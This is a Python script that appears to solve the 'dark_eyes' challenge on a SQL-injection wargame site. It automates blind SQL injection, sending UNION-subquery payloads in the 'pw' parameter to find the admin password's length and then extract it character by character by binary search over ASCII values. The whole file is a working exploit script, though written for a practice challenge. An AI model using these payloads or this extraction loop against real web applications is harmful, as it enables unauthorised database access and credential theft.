import requests

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
cookies = { "PHPSESSID" : "쿠키값" }

def pw_length():
    length = 1

    while True:
        params = { "pw" : "' or id='admin' and (select 1 union select length(pw)={}) #".format(length) }
        request = requests.get(url, params=params, cookies=cookies)

        if " " in request.text:
            return length
        else:
            length += 1

def pw_crack():
    password_length = pw_length()
    password = ''

    for i in range(1, password_length+1):
        start, end, mid = 1, 127, 64
        while True:
            params = { "pw" : "' or id='admin' and (select 1 union select ascii(substring(pw, {}, 1))={}) #".format(i, mid) }
            request = requests.get(url, params=params, cookies=cookies)

            if " " in request.text:
                password = password + chr(mid)
                print("패스워드:", password)
                break
            else:
                params = { "pw" : "' or id='admin' and (select 1 union select ascii(substring(pw, {}, 1))>{}) #".format(i, mid) }
                request = requests.get(url, params=params, cookies=cookies)

                if " " in request.text:
                    start = mid
                    mid = (mid + end) // 2
                else:
                    end = mid
                    mid = (start + end) // 2

pw_crack()
